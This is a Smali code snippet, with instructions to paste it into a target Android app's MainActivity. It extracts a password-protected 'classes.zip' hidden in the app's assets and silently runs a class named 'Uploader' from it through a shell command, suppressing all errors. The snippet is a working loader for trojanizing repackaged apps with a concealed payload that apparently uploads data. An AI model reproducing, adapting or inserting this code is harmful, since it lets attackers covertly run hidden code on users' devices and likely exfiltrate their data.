/*paste the following codes in your target app's smali
e.g. if you would like to do something in MainActivity.java, append these code in the MainActivity.smali
search for target smali files: https://play.google.com/store/apps/details?id=com.willme.topactivity&hl=en_US&gl=US
*/

//The method caller: invoke-direct {p0}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_modify/MainActivity;->iq500Uploader()V

.method private iq500copy(Ljava/io/InputStream;Ljava/io/OutputStream;)V
    .registers 15
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/io/InputStream;",
            "Ljava/io/OutputStream;",
            ")V^",
            "Ljava/io/IOException;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 185
    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    const/16 v7, 0x400

    new-array v7, v7, [B

    move-object v4, v7

    .line 187
    :goto_8
    move-object v7, v1

    move-object v8, v4

    invoke-virtual {v7, v8}, Ljava/io/InputStream;->read([B)I

    move-result v7

    move v11, v7

    move v7, v11

    move v8, v11

    move v5, v8

    const/4 v8, -0x1

    if-ne v7, v8, :cond_16

    return-void

    .line 188
    :cond_16
    move-object v7, v2

    move-object v8, v4

    const/4 v9, 0x0

    move v10, v5

    invoke-virtual {v7, v8, v9, v10}, Ljava/io/OutputStream;->write([BII)V

    goto :goto_8
.end method

.method private iq500Uploader()V
    .registers 20
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 194
    move-object/from16 v0, p0

    move-object v10, v0

    invoke-virtual {v10}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_modify/MainActivity;->getCacheDir()Ljava/io/File;

    move-result-object v10

    move-object v2, v10

    .line 195
    move-object v10, v2

    invoke-virtual {v10}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v10

    move-object v3, v10

    .line 196
    new-instance v10, Ljava/io/File;

    move-object/from16 v18, v10

    move-object/from16 v10, v18

    move-object/from16 v11, v18

    new-instance v12, Ljava/lang/StringBuffer;

    move-object/from16 v18, v12

    move-object/from16 v12, v18

    move-object/from16 v13, v18

    invoke-direct {v13}, Ljava/lang/StringBuffer;-><init>()V

    move-object v13, v3

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    const-string v13, "/classes.zip"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v4, v10

    .line 200
    move-object v10, v4

    :try_start_35
    invoke-virtual {v10}, Ljava/io/File;->exists()Z

    move-result v10

    if-nez v10, :cond_80

    .line 202
    move-object v10, v0

    invoke-virtual {v10}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_modify/MainActivity;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v10

    move-object v5, v10

    .line 203
    move-object v10, v5

    const-string v11, "classes.zip"

    invoke-virtual {v10, v11}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v10

    move-object v6, v10

    .line 204
    new-instance v10, Ljava/io/FileOutputStream;

    move-object/from16 v18, v10

    move-object/from16 v10, v18

    move-object/from16 v11, v18

    move-object v12, v4

    invoke-direct {v11, v12}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    move-object v7, v10

    .line 205
    move-object v10, v0

    move-object v11, v6

    move-object v12, v7

    invoke-direct {v10, v11, v12}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_modify/MainActivity;->iq500copy(Ljava/io/InputStream;Ljava/io/OutputStream;)V

    .line 206
    move-object v10, v6

    invoke-virtual {v10}, Ljava/io/InputStream;->close()V

    .line 207
    move-object v10, v7

    invoke-virtual {v10}, Ljava/io/OutputStream;->flush()V

    .line 208
    move-object v10, v7

    invoke-virtual {v10}, Ljava/io/OutputStream;->close()V

    .line 210
    new-instance v10, Lnet/lingala/zip4j/core/ZipFile;

    move-object/from16 v18, v10

    move-object/from16 v10, v18

    move-object/from16 v11, v18

    move-object v12, v4

    invoke-direct {v11, v12}, Lnet/lingala/zip4j/core/ZipFile;-><init>(Ljava/io/File;)V

    move-object v8, v10

    .line 211
    move-object v10, v8

    const-string v11, "a"

    invoke-virtual {v10, v11}, Lnet/lingala/zip4j/core/ZipFile;->setPassword(Ljava/lang/String;)V

    .line 212
    move-object v10, v8

    move-object v11, v3

    invoke-virtual {v10, v11}, Lnet/lingala/zip4j/core/ZipFile;->extractAll(Ljava/lang/String;)V

    .line 217
    :cond_80
    const/4 v10, 0x3

    new-array v10, v10, [Ljava/lang/String;

    move-object/from16 v18, v10

    move-object/from16 v10, v18

    move-object/from16 v11, v18

    const/4 v12, 0x0

    const-string v13, "sh"

    aput-object v13, v11, v12

    move-object/from16 v18, v10

    move-object/from16 v10, v18

    move-object/from16 v11, v18

    const/4 v12, 0x1

    const-string v13, "-c"

    aput-object v13, v11, v12

    move-object/from16 v18, v10

    move-object/from16 v10, v18

    move-object/from16 v11, v18

    const/4 v12, 0x2

    const-string v13, "cd %s && dalvikvm -cp classes.dex Uploader > .upr3su1t"

    const/4 v14, 0x1

    new-array v14, v14, [Ljava/lang/Object;

    move-object/from16 v18, v14

    move-object/from16 v14, v18

    move-object/from16 v15, v18

    const/16 v16, 0x0

    move-object/from16 v17, v3

    aput-object v17, v15, v16

    invoke-static {v13, v14}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v13

    aput-object v13, v11, v12

    move-object v5, v10

    .line 218
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v10

    move-object v11, v5

    invoke-virtual {v10, v11}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
    :try_end_c0
    .catch Ljava/lang/Exception; {:try_start_35 .. :try_end_c0} :catch_c2

    move-result-object v10

    :goto_c1
    return-void

    :catch_c2
    move-exception v10

    move-object v5, v10

    goto :goto_c1
.end method
